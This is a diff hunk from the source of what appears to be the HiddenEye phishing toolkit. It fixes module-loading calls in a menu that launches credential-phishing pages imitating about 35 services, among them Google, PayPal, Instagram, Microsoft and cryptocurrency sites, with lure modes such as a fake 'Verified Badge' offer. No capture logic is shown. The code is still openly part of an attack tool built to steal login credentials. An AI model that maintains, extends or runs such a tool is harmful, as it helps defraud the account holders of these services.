@@ -586,174 +586,174 @@ class EssentialsManager:
             ActionsManager.runPhishing(
                 'Facebook', customOption, EssentialsManager.endMessage)
         elif option == '2':
-            loadModule('Google')
+            EssentialsManager.loadModule('Google')
             customOption = input(
                 "\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n {0}[{1}3{0}]{1} New Google Web\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
             ActionsManager.runPhishing(
                 'Google', customOption, EssentialsManager.endMessage)
         elif option == '3':
-            loadModule('LinkedIn')
+            EssentialsManager.loadModule('LinkedIn')
             customOption = ''
             ActionsManager.runPhishing(
                 'LinkedIn', customOption, EssentialsManager.endMessage)
         elif option == '4':
-            loadModule('GitHub')
+            EssentialsManager.loadModule('GitHub')
             customOption = ''
             ActionsManager.runPhishing(
                 'GitHub', customOption, EssentialsManager.endMessage)
         elif option == '5':
-            loadModule('StackOverflow')
+            EssentialsManager.loadModule('StackOverflow')
             customOption = ''
             ActionsManager.runPhishing(
                 'StackOverflow', customOption, EssentialsManager.endMessage)
         elif option == '6':
-            loadModule('WordPress')
+            EssentialsManager.loadModule('WordPress')
             customOption = ''
             ActionsManager.runPhishing(
                 'WordPress', customOption, EssentialsManager.endMessage)
         elif option == '7':
-            loadModule('Twitter')
+            EssentialsManager.loadModule('Twitter')
             customOption = ''
             ActionsManager.runPhishing(
                 'Twitter', customOption, EssentialsManager.endMessage)
         elif option == '8':
-            loadModule('Instagram')
+            EssentialsManager.loadModule('Instagram')
             customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
             ActionsManager.runPhishing(
                 'Instagram', customOption, EssentialsManager.endMessage)
         elif option == '9':
-            loadModule('Snapchat')
+            EssentialsManager.loadModule('Snapchat')
             customOption = ''
             ActionsManager.runPhishing(
                 'Snapchat', customOption, EssentialsManager.endMessage)
         elif option == '10':
-            loadModule('Yahoo')
+            EssentialsManager.loadModule('Yahoo')
             customOption = ''
             ActionsManager.runPhishing(
                 'Yahoo', customOption, EssentialsManager.endMessage)
         elif option == '11':
-            loadModule('Twitch')
+            EssentialsManager.loadModule('Twitch')
             customOption = ''
             ActionsManager.runPhishing(
                 'Twitch', customOption, EssentialsManager.endMessage)
         elif option == '12':
-            loadModule('Microsoft')
+            EssentialsManager.loadModule('Microsoft')
             customOption = ''
             ActionsManager.runPhishing(
                 'Microsoft', customOption, EssentialsManager.endMessage)
         elif option == '13':
-            loadModule('Steam')
+            EssentialsManager.loadModule('Steam')
             customOption = ''
             ActionsManager.runPhishing(
                 'Steam', customOption, EssentialsManager.endMessage)
         elif option == '14':
-            loadModule('VK')
+            EssentialsManager.loadModule('VK')
             customOption = input(
                 "\nOperation mode:\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
             ActionsManager.runPhishing(
                 'VK', customOption, EssentialsManager.endMessage)
         elif option == '15':
-            loadModule('iCloud')
+            EssentialsManager.loadModule('iCloud')
             customOption = ''
             ActionsManager.runPhishing(
                 'iCloud', customOption, EssentialsManager.endMessage)
         elif option == '16':
-            loadModule('GitLab')
+            EssentialsManager.loadModule('GitLab')
             customOption = ''
             ActionsManager.runPhishing(
                 'GitLab', customOption, EssentialsManager.endMessage)
         elif option == '17':
-            loadModule('NetFlix')
+            EssentialsManager.loadModule('NetFlix')
             customOption = ''
             ActionsManager.runPhishing(
                 'NetFlix', customOption, EssentialsManager.endMessage)
         elif option == '18':
-            loadModule('Origin')
+            EssentialsManager.loadModule('Origin')
             customOption = ''
             ActionsManager.runPhishing(
                 'Origin', customOption, EssentialsManager.endMessage)
         elif option == '19':
-            loadModule('Pinterest')
+            EssentialsManager.loadModule('Pinterest')
             customOption = ''
             ActionsManager.runPhishing(
                 'Pinterest', customOption, EssentialsManager.endMessage)
         elif option == '20':
-            loadModule('ProtonMail')
+            EssentialsManager.loadModule('ProtonMail')
             customOption = ''
             ActionsManager.runPhishing(
                 'ProtonMail', customOption, EssentialsManager.endMessage)
         elif option == '21':
-            loadModule('Spotify')
+            EssentialsManager.loadModule('Spotify')
             customOption = ''
             ActionsManager.runPhishing(
                 'Spotify', customOption, EssentialsManager.endMessage)
         elif option == '22':
-            loadModule('Quora')
+            EssentialsManager.loadModule('Quora')
             customOption = ''
             ActionsManager.runPhishing(
                 'Quora', customOption, EssentialsManager.endMessage)
         elif option == '23':
-            loadModule('PornHub')
+            EssentialsManager.loadModule('PornHub')
             customOption = ''
             ActionsManager.runPhishing(
                 'PornHub', customOption, EssentialsManager.endMessage)
         elif option == '24':
-            loadModule('Adobe')
+            EssentialsManager.loadModule('Adobe')
             customOption = ''
             ActionsManager.runPhishing(
                 'Adobe', customOption, EssentialsManager.endMessage)
         elif option == '25':
-            loadModule('Badoo')
+            EssentialsManager.loadModule('Badoo')
             customOption = ''
             ActionsManager.runPhishing(
                 'Badoo', customOption, EssentialsManager.endMessage)
         elif option == '26':
-            loadModule('CryptoCurrency')
+            EssentialsManager.loadModule('CryptoCurrency')
             customOption = ''
             ActionsManager.runPhishing(
                 'CryptoCurrency', customOption, EssentialsManager.endMessage)
         elif option == '27':
-            loadModule('DevianArt')
+            EssentialsManager.loadModule('DevianArt')
             customOption = ''
             ActionsManager.runPhishing(
                 'DevianArt', customOption, EssentialsManager.endMessage)
         elif option == '28':
-            loadModule('DropBox')
+            EssentialsManager.loadModule('DropBox')
             customOption = ''
             ActionsManager.runPhishing(
                 'DropBox', customOption, EssentialsManager.endMessage)
         elif option == '29':
-            loadModule('eBay')
+            EssentialsManager.loadModule('eBay')
             customOption = ''
             ActionsManager.runPhishing(
                 'eBay', customOption, EssentialsManager.endMessage)
         elif option == '30':
-            loadModule('MySpace')
+            EssentialsManager.loadModule('MySpace')
             customOption = ''
             ActionsManager.runPhishing(
                 'Myspace', customOption, EssentialsManager.endMessage)
         elif option == '31':
-            loadModule('PayPal')
+            EssentialsManager.loadModule('PayPal')
             customOption = ''
             ActionsManager.runPhishing(
                 'PayPal', customOption, EssentialsManager.endMessage)
         elif option == '32':
-            loadModule('Shopify')
+            EssentialsManager.loadModule('Shopify')
             customOption = ''
             ActionsManager.runPhishing(
                 'Shopify', customOption, EssentialsManager.endMessage)
         elif option == '33':
-            loadModule('Verizon')
+            EssentialsManager.loadModule('Verizon')
             customOption = ''
             ActionsManager.runPhishing(
                 'Verizon', customOption, EssentialsManager.endMessage)
         elif option == '34':
-            loadModule('Yandex')
+            EssentialsManager.loadModule('Yandex')
             customOption = ''
             ActionsManager.runPhishing(
                 'Yandex', customOption, EssentialsManager.endMessage)
         elif option == '35':
-            loadModule('Reddit')
+            EssentialsManager.loadModule('Reddit')
             customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} New reddit page\n {0}[{1}2{0}]{1} Old reddit page\n{0}HiddenEye >>> {2}".format(
                 MAIN0, MAIN2, MAIN2))
             ActionsManager.runPhishing(
